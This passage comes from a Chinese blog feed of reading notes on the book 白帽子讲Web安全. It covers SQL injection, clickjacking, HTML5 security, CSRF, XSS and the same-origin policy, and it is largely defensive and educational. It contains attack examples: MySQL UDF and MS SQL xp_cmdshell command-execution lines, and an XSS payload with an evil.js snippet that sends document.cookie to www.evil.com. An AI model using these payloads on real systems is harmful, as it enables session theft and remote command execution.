title="数据库攻击技巧"></a>数据库攻击技巧</h3><p><strong>常见的攻击技巧</strong></p><p>在MYSQL中，可以通过<strong>LOAD_FILE()</strong>读取系统文件，通过<strong>INTO DUMPFILE</strong>写入本地文件，当然这要求当前数据库用户有读写系统相应文件或目录的权限。</p><p>除了可以使用INTO DUMPFILE外，还可以使用INTO OUTFILE，两者的区别是DUMPFILE适用于二进制文件，它会将目标文件写入同一行内；而OUTFILE则更适合用于文本文件。</p><p><strong>命令执行</strong></p><p>在MYSQL中，除了可以通过导入webshell间接地执行命令外，还可以**利用“用户自定义函数”的技巧，即UDF(User-Defined Functions)来执行命令。</p><p>在流行的数据库中，一般都支持从本地文件系统中导入一个共享库文件作为自定义函数。使用如下语法可以创建UDF：</p><p><code>CREATE FUNCTION f_name RETURNS INTEGER SONAME shared_library</code></p><p>在攻击过程中，将lib_mysqludf_sys.so上传到数据库能访问到的路径下。在创建UDF之后，就可以使用sys_eval()等函数执行系统命令了。</p><ul><li><p>sys_eval，执行任意命令，并将输出返回。</p></li><li><p>sys_exec，执行任意命令，并将退出码返回。</p></li><li><p>sys_get，获取一个环境变量。</p></li><li><p>sys_set，创建或修改一个环境变量。</p></li></ul><p><strong>攻击存储过程</strong></p><p>存储过程必须使用CALL或者EXECUTE来执行。</p><p>在MS SQL Server中，可以直接使用存储过程“xp_cmdshell”执行系统命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &apos;cmd.exe dir c:&apos;</span><br><span class="line">EXEC master.dbo.xp_cmdshell &apos;ping&apos;</span><br></pre></td></tr></table></figure><p>xp_cmdshell在SQL Server 2000 中默认是开启的，但在SQL Server 2005以及以后版本中则默认被禁止了。但是如果当前数据库用户拥有sysadmin权限，则可以使用sp_configure（SQL Server 2005与SQL Server 2008）重新开启它；如果在SQL Server 2000 中禁用了xp_cmdshell，则可以使用sp_addextendedproc开启它。xp_regread可以操作注册表。</p><p>存储过程本身也可能会存在注入漏洞。</p><p><strong>编码问题</strong></p><p>在应用中，开发者为了安全，经常会使用转义字符“\”来转义特殊符号。但当数据库使用了“宽字符集”是，可能会产生一些意想不到的漏洞。比如：当MYSQL使用了GBK编码时，0xbf27和0xbf5c都会被认为是一个字符（双字节字符）。</p><p>在进入数据库之前，在Web语言中则没有考虑到双字节字符的问题，双字节字符会被认为是两个字节。比如PHP中的addslashes()函数，或者当magic_quotes_gpc开启时，会在特殊字符前增加一个转义字符“\”。</p><p>要解决这种问题，需要<strong>统一数据库、操作系统、Web应用所使用的字符集，以避免各层对字符的理解存在差异。</strong> 统一设置为UTF-8是一个很好的方法。</p><p>基于字符集的攻击并不局限于SQL注入，凡是会解析数据的地方都可能存在此问题。比如在XSS攻击时，由于浏览器与服务器返回的字符编码不同，也可能会存在字符集攻击。解决方法就是在HTML页面的<code>&lt;meta&gt;</code> 标签中指定当前页面的charset。</p><p><strong>SQL Column Truncation</strong></p><p>在MYSQL的配置选项中，有一个sql_mode选项。当MySQL的sql_mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warning，而不是error（如果是error则插入不成功），这可能会导致发生一些“截断”问题。</p><h3 id="正确防御SQL注入"><a href="#正确防御SQL注入" class="headerlink" title="正确防御SQL注入"></a>正确防御SQL注入</h3><p>从防御的角度来看，要做的事情有两件：</p><ul><li><p>找到所有的SQL注入漏洞；</p></li><li><p>修补这些漏洞。</p></li></ul><p>解决好这两个问题，就能有效地防御SQL注入攻击。</p><p><strong>使用预编译语句</strong></p><p>防御SQL注入的最佳方法，就是使用预编译语句，绑定变量。</p><p><strong>使用存储过程</strong></p><p>使用安全的存储过程对抗SQL注入。但需要注意的是，存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的SQL语句。如果无法避免，则应该使用严格的输入过滤或者是编码函数来处理用户的输入数据。</p><p><strong>检查数据类型</strong></p><p>检查输入数据的数据类型，在很大程度上可以对抗SQL注入。</p><p><strong>使用安全函数</strong></p><p>可以参考OWASP ESAPI中的实现。</p><p>最后，从数据库自身的角度来说，应该使用<strong>最小权限原则。</strong></p><h3 id="其他注入攻击"><a href="#其他注入攻击" class="headerlink" title="其他注入攻击"></a>其他注入攻击</h3><p><strong>XML注入</strong></p><p>和XSS类似。危害：读取任意文件、执行系统命令、探测内网端口、攻击内网网站。防御：使用开发语言提供的禁用外部实体的方法、过滤用户提交的XML数据。</p><p><strong>代码注入</strong></p><p>代码注入和命令注入往往都是由一些不安全的函数或者方法引起的，其中的典型代表就是eval()。</p><p>代码注入往往是由于不安全的编程习惯所造成的，危险函数应该尽量避免在开发中使用。</p><p><strong>CRLF注入</strong></p><p>CRLF实际上是两个字符：CR是Carriage Return（ASCII 13, \r），LF是Line Feed（ASCII 10, \n）。<code>\r\n</code>这两个字符是用于表示换行的，其十六进制编码分别为：0x0d、0x0a。</p><p>在HTTP头中的CRLF注入，又可以称为<strong>“Http Response Splitting”。</strong></p><p>两次<code>“\r\n”</code>换行符意味着HTTP头的结束。注入一个Link头，在新版本的浏览器上将造成XSS：<code>Link: &lt;http://www.a.com/xss.css&gt;; REL:stylesheet</code></p><p>而注入<code>X-XSS-Protection: 0</code> 则可以关闭IE8的XSS Filter功能。</p><p>对抗CRLF的方法非常简单，只需要处理好“\r”、“\n”这两个保留字符即可，尤其是那些使用“换行符”作为分隔符的应用。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》五</title>
    <link href="http://wlfsky.com/2018/01/26/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E4%BA%94/"/>
    <id>http://wlfsky.com/2018/01/26/精读《白帽子讲Web安全》五/</id>
    <published>2018-01-26T03:41:58.000Z</published>
    <updated>2018-01-26T06:30:54.990Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="五、点击劫持"><a href="#五、点击劫持" class="headerlink" title="五、点击劫持"></a>五、点击劫持</h2><h3 id="点击劫持（ClickJacking）"><a href="#点击劫持（ClickJacking）" class="headerlink" title="点击劫持（ClickJacking）"></a>点击劫持（ClickJacking）</h3><p>点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。</p><h3 id="图片覆盖攻击（XSIO）"><a href="#图片覆盖攻击（XSIO）" class="headerlink" title="图片覆盖攻击（XSIO）"></a>图片覆盖攻击（XSIO）</h3><p>图片覆盖攻击（Cross Site Image Overlaying），简称：XSIO。通过调整图片的style使得图片能够覆盖在他所指定的任意位置。</p><h3 id="拖拽劫持与数据窃取"><a href="#拖拽劫持与数据窃取" class="headerlink" title="拖拽劫持与数据窃取"></a>拖拽劫持与数据窃取</h3><p>拖拽劫持的思路是诱使用户从隐藏的不可见iframe中“拖拽”出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。</p><h3 id="触屏劫持（TapJacking）"><a href="#触屏劫持（TapJacking）" class="headerlink" title="触屏劫持（TapJacking）"></a>触屏劫持（TapJacking）</h3><p>在手机上实施触屏劫持，这种针对视觉效果的攻击可以被利用进行钓鱼和欺诈。</p><h3 id="防御ClickJacking"><a href="#防御ClickJacking" class="headerlink" title="防御ClickJacking"></a>防御ClickJacking</h3><p><strong>frame busting</strong></p><p>通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫frame busting。比如以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (top.location != location) &#123;</span><br><span class="line">  top.location = self.location;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是frame busting也存在一些缺陷。由于它是用JavaScript写的，控制能力并不是特别强，因此有许多方法可以绕过它。</p><p><strong>X-Frame-Options</strong></p><p>使用一个HTTP头——X-Frame-Options。它可以说是为了解决ClickJacking而生的。它有三个可选的值：</p><ul><li>DENY</li><li>SAMEORIGIN</li><li>ALLOW-FROM origin</li></ul><p>当值为DENY时，浏览器会拒绝当前页面加载任何frame页面；若值为SAMEORIGIN，则frame页面的地址只能为同源域名下的页面；若值为ALLOW-FROM，则可以定义允许frame加载的页面地址。</p><p>除了X-Frame-Options之外，Firefox的“Content Security Policy”以及Firefox的NoScript扩展也能够有效防御ClickJacking，这些方案为我们提供了更多的选择。</p><h2 id="六、HTML5安全"><a href="#六、HTML5安全" class="headerlink" title="六、HTML5安全"></a>六、HTML5安全</h2><p>HTML5是W3C制定的新一代HTML语言的标准。</p><h3 id="新标签的XSS"><a href="#新标签的XSS" class="headerlink" title="新标签的XSS"></a>新标签的XSS</h3><p>HTML5定义了很多新标签、新事件，这有可能带来新的XSS攻击。</p><p>一些XSS Filter如果建立了黑名单的话，则可能就不会覆盖到HTML5新增的标签和功能，从而避免发生XSS。</p><p>HTML5中新增的一些标签和属性，使得XSS等Web攻击产生了新的变化，为了总结这些变化，有安全研究者建立了一个<a href="http://html5sec.org/" target="_blank" rel="noopener">HTML5 Security Cheatsheet</a>项目，此项目对研究HTML5安全有着重要作用。</p><p><strong>iframe的sandbox</strong></p><p>在HTML5中，专门为iframe定义了一个新的属性，叫sandbox。使用sandbox这一个属性后，iframe标签加载的内容将被视为一个独立的“源”，其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其它浏览对象的链接也会被禁止。</p><p>sandbox属性可以通过参数来支持更精确的控制。有以下几个可以选择：</p><ul><li>allow-same-origin：允许同源访问；</li><li>allow-top-navigation：允许访问顶层窗口；</li><li>allow-forms：允许提交表单；</li><li>allow-scripts：允许执行脚本。</li></ul><p>可有的行为即便是设置了allow-scripts，也是不允许的，比如“弹出窗口”。</p><p>一个iframe的实例如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">"allow-same-origin allow-forms allow-scripts"</span> <span class="attr">src</span>=<span class="string">"http://maps.example.com/embedded.html"</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>毫无疑问，iframe的sandbox属性将极大的增强应用使用iframe的安全性。</p><p><strong>Link Types: noreferrer</strong></p><p>在HTML5中为<code>&lt;a&gt;</code>标签和<code>&lt;area&gt;</code>标签定义了一个新的Link Types:noreferrer。</p><p>标签制定了noreferrer后，浏览器在请求该标签指定的地址时将不再发送Referer</p><p><code>&lt;a href=&quot;xxx&quot; rel=&quot;noreferrer&quot;&gt;test&lt;/a&gt;</code></p><p>这种设计是出于保护敏感信息和隐私的考虑。因为通过Referer，可能会泄露一些敏感信息。这个标签需要开发者手动添加。</p><p><strong>Canvas的妙用</strong></p><p>canvas标签让JavaScript可以在页面中直接操作图片对象，也可以直接操作像素，构造出图片区域。canvas提供的强大功能，甚至可以用来破解验证码。</p><h3 id="其他安全问题"><a href="#其他安全问题" class="headerlink" title="其他安全问题"></a>其他安全问题</h3><p><strong>Cross-Origin Resource Sharing</strong></p><p>Origin Header用于标记HTTP发起的“源”，服务器端通过识别浏览器自动带上的这个Origin Header，来判断浏览器的请求是否来自一个合法的“源”。Origin Header可以用于防范CSRF，它不像Referer那么容易被伪造或清空。</p><p><strong>postMessage——跨窗口传递消息</strong></p><p>postMassage允许每一个window（包括当前窗口、弹出窗口、iframes等）对象往其他的窗口发送文本消息，从而实现跨窗口的消息传递。这个功能是不受同源策略限制的。</p><p><strong>Web Storage</strong></p><p>Web Storage分为Session Storage和Local Storage。Session Storahe关闭浏览器就会失效，而Local Storage则会一直存在。Web Storage就像一个非关系型数据库，由Key-Value对组成，可以通过JavaScript对其进行操作。</p><ul><li>设置一个值：window.sessionStorage.setItem(key, value)；</li><li>读取一个值：window.sessionStorage.getItem(key)；</li></ul><p>此外。Firefox还单独实现了一个globalStorage，它是基于SQLite实现的。</p><p>window.globalStorage.namedItem(domain).setItem(key, value)；</p><p>Web Storage也受到同源策略的约束，每个域所拥有的的信息只会保存在自己的域下。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="点击劫持" scheme="http://wlfsky.com/tags/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/"/>
    
      <category term="HTML5安全" scheme="http://wlfsky.com/tags/HTML5%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》四</title>
    <link href="http://wlfsky.com/2018/01/26/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E5%9B%9B/"/>
    <id>http://wlfsky.com/2018/01/26/精读《白帽子讲Web安全》四/</id>
    <published>2018-01-26T02:38:49.000Z</published>
    <updated>2018-01-26T03:43:16.442Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="四、跨站点请求伪造（CSRF）"><a href="#四、跨站点请求伪造（CSRF）" class="headerlink" title="四、跨站点请求伪造（CSRF）"></a>四、跨站点请求伪造（CSRF）</h2><h3 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h3><p>CSRF的全名是Cross Site Request Forgery，它的一般操作过程为：诱使用户访问一个攻击者自己构造的页面，然后以该用户的身份在第三方站点执行操作。</p><h3 id="CSRF进阶"><a href="#CSRF进阶" class="headerlink" title="CSRF进阶"></a>CSRF进阶</h3><p><strong>浏览器的Cookie策略</strong></p><p>浏览器所持有的Cookie分为两种：一种是“Session Cookie”，又称“临时Cookie”;另一种是“Third-party Cookie”，也称为“本地Cookie”。</p><p>Third-party Cookie是服务器在Set-Cookie时指定了Expire时间，只有到了Expire时间后Cookie才会失效，所以这种Cookie会保存在本地；而Session Cookie则没有指定Expire时间，所以浏览器关闭后，Session Cookie就失效了。</p><p>如果浏览器从一个域的页面中，要加载另一个域的资源，由于安全原因，某些浏览器会阻止Third-party Cookie的发送。</p><p>第三方Cookie就是本地Cookie。</p><p><strong>P3P头的副作用</strong></p><p>P3P Header是W3C指定的一项关于隐私的标准，全称是：The Platform for Privacy Preferences。在网站的业务中，P3P头主要用于类似广告等需要跨域访问的页面。</p><p>如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。</p><h3 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h3><p><strong>验证码</strong></p><p>验证码被认为是对抗CSRF攻击最简洁而有效的防御方法。</p><p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能很好地遏制CSRF攻击。</p><p>但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为防御CSRF攻击的一种辅助手段，而不能作为最主要的解决方案。</p><p><strong>Referer Check</strong></p><p>检查请求是否来自合法的“源”。但是服务器并非什么时候都能渠道Referer。很多用户出于隐私保护也会限制Referer的发送，所以无法依赖Referer Check作为防御的主要手段。但是通过Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。</p><p><strong>Anti CSRF Token</strong></p><p><strong>CSRF能攻击成功的本质原因是重要操作的所有参数都是可以被攻击者猜测到的。</strong></p><p>Anti CSRF Token的方式为：保持参数不变，新增一个参数Token。这个Token的值随机的，不可预测。而且Token需要同时放在表单和Session中。在请求提交时，服务器只需验证表单中的Token，与用户Session或Cookie中的Token是否一致就可以判断是否发生CSRF攻击。</p><p><strong>注意Token的随机性与保密性。</strong> 尽量把Token放在表单中，把敏感操作有GET改为POST，以form表单或者AJAX的形式提交，可以避免Token泄露。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CSRF" scheme="http://wlfsky.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》三</title>
    <link href="http://wlfsky.com/2018/01/25/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E4%B8%89/"/>
    <id>http://wlfsky.com/2018/01/25/精读《白帽子讲Web安全》三/</id>
    <published>2018-01-25T06:21:17.000Z</published>
    <updated>2018-01-25T13:01:47.390Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="三、跨站脚本攻击（XSS）"><a href="#三、跨站脚本攻击（XSS）" class="headerlink" title="三、跨站脚本攻击（XSS）"></a>三、跨站脚本攻击（XSS）</h2><h3 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h3><p>跨站脚本攻击，英文全称是Cross Site Script，本来缩写CSS，但是为了和层叠样式表（Cascading Style Sheet，CSS）有所区别，所以在安全领域叫做“XSS”。</p><p>XSS攻击，通常指黑客通过“HTML”注入篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p><h3 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h3><p>XSS分为<strong>反射型XSS，存储型XSS，DOM Based XSS。</strong></p><p><strong>反射型XSS：</strong> 反射型XSS只是简单的把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型XSS也叫做“非持久型XSS”。</p><p><strong>存储型XSS：</strong> 存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。</p><p><strong>DOM Based XSS：</strong>  DOM Based XSS从效果上来说也是反射型XSS。它是从JavaScript中输出数据到HTML页面里，其它是从服务器应用直接输出到HTML页面。</p><h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><p><strong>XSS窃取Cookie</strong></p><p>Cookie中一般加密保存了当前用户的登录凭证，换句话说，Cookie一般是用户的登录凭证。如果攻击者拿到了Cookie，则可以不用密码直接登录用户的账户。</p><p>下面举个例子：</p><p>攻击者首先加载一个远程脚本：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.htm?abc="&gt;&lt;script src = http://www.evil.com/ evil.js &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。</p><p>在evil.js中，可以通过如下代码窃取Cookie：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src = <span class="string">"http://www.evil.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure><p>Cookie的<strong>“HttpOnly”</strong> 标识可以防止“Cookie劫持”。</p><p><strong>构造GET与POST请求</strong></p><p>攻击者可以通过插入一张图片来发起一个GET请求。</p><p>攻击者可以通过构造一个form表单或通过XMLHttpRequest来模拟发送一个POST请求从而控制用户浏览器。</p><p><strong>XSS钓鱼</strong></p><p>利用JavaScript在当前页面上“画出”一个伪造的登录框，当用户在登录框中输入用户名与密码后，其密码将被发送至黑客的服务器上。</p><p><strong>识别用户浏览器以及用户的真实IP</strong></p><p>利用<code>alert(navigator.userAgent);</code> 来识别用户浏览器</p><p>利用XSS攻击框架”Attack API”来获取用户IP。</p><p><strong>XSS攻击平台</strong></p><p>Attack API，BeEF，XSS-Proxy等。</p><p><strong>XSS构造技巧</strong></p><ul><li><p>利用字符编码</p></li><li><p>绕过长度限制：可以采用事件，也可以采用<code>location.hash</code> ，还可以使用注释符绕过长度限制。</p></li><li><p>使用<code>&lt;base&gt;</code> 标签：这个标签的作用是定义页面上所有使用“相对路径”标签的Hosting地址。比如<code>&lt;img src=&#39;/images/photo.jpg&#39;&gt;</code> ，在img标签前加入一个<code>&lt;base&gt;</code> 标签，变为‘</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"http://www.example.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/images/photo.jpg"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;base&gt;</code> 标签将指定其后面的标签从www.example.com中取URL。</p></li><li><p>window.name可以实现跨域传递，也可以缩短XSS Payload。</p><p>假设“www.a.com/test.html”的代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name = <span class="string">"test"</span>;</span></span><br><span class="line"><span class="javascript">alert(<span class="built_in">document</span>.domain+<span class="string">"   "</span>+<span class="built_in">window</span>.name);</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location = <span class="string">"http://www.b.com/test1.html"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>“www.b.com/test1.html”的代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">alert(<span class="built_in">document</span>.domain+<span class="string">"  "</span>+<span class="built_in">window</span>.name)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个过程实现了数据的跨域传递：test从a传到b。</p></li><li><p><strong>Flash XSS</strong> </p></li><li><p><strong>JQuery</strong> ：html()产生”DOM Based XSS”。</p></li></ul><h3 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h3><p><strong>HttpOnly</strong> ：严格的说，HttpOnly并非为了对抗XSS，它解决的是XSS后的Cookie劫持攻击。</p><p><strong>Cookie的使用过程</strong> ：</p><ul><li>Step1：浏览器向服务器发起请求，这时候没有Cookie。</li><li>Step2：服务器返回时发送Set-Cookie头，向客户端浏览器写入Cookie。</li><li>Step3：在该Cookie到期前，浏览器访问该域下的所有页面，都将发送该Cookie。HttpOnly是在Set-Cookie时标记的。</li></ul><p><strong>输入检查</strong> ：称之为“XSS Filter”，输入检查的逻辑，必须放在服务器端代码中实现。如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的。目前WEB开发的普遍做法，是同时在客户端JavaScript中和服务器端代码中实现相同的输入检查。</p><p><strong>输出检查</strong> ：一般来说，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p><ul><li>针对HTML代码的编码方式是HtmlEncode。</li><li>在PHP中，有htmlentities()和htmlspecialchars()。</li><li>JavaScript的编码方式可以使用JavaScriptEncode。它的变量输出一定要在引号中。</li></ul><p>XSS攻击主要发生在MVC架构中的View层。<strong>XSS的本质是一种“HTML”注入。</strong></p><h3 id="正确地防御XSS"><a href="#正确地防御XSS" class="headerlink" title="正确地防御XSS"></a>正确地防御XSS</h3><p>在HTML标签中输出：使用HtmlEncode。</p><p>在HTML属性中输出：使用HtmlEncode。</p><p>在<code>&lt;script&gt;</code>中输出：使用JavaScriptEncode。</p><p>在事件中输出：使用JavaScriptEncode。</p><p>在CSS中输出：使用OWASP ESAPI中的encodeForCSS()函数。</p><p>在地址中输出：使用URLEncode。</p><p><strong>处理富文本</strong>： 有时候，网站需要允许用户提交一些自定义的HTML代码，称之为“富文本”。处理富文本时，在标签的选择上应使用白名单，避免使用黑名单。</p><p><strong>防御DOM Based XSS</strong>： 根据语境来使用编码函数。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://wlfsky.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》二</title>
    <link href="http://wlfsky.com/2018/01/24/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E4%BA%8C/"/>
    <id>http://wlfsky.com/2018/01/24/精读《白帽子讲Web安全》二/</id>
    <published>2018-01-24T14:17:12.000Z</published>
    <updated>2018-01-25T13:20:12.889Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="第二章、浏览器安全"><a href="#第二章、浏览器安全" class="headerlink" title="第二章、浏览器安全"></a>第二章、浏览器安全</h2><h3 id="同源策略（Same-Origin-Policy）"><a href="#同源策略（Same-Origin-Policy）" class="headerlink" title="同源策略（Same Origin Policy）"></a>同源策略（Same Origin Policy）</h3><p>同源策略是一种约定，它是浏览器最核心也是最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略的基础之上的，浏览器只是针对同源策略的一种实现。<br>同源策略，它是由<a href="https://baike.baidu.com/item/Netscape/2778944" target="_blank" rel="noopener">Netscape</a>提出的一个著名的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/2890163" target="_blank" rel="noopener">安全策略</a>。<br>现在所有支持JavaScript 的浏览器都会使用这个策略。<br>所谓同源是指，<strong>域名</strong>，<strong>协议</strong>，<strong>端口</strong>相同。<br>如果有一个地址为：<code>http://example.com</code>，则：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/test/a.html # 同源</span><br><span class="line">https://example.com # 不同源，协议不同</span><br><span class="line">http://www.example.com # 不同源，host 不同</span><br><span class="line">http://example.com:8080 # 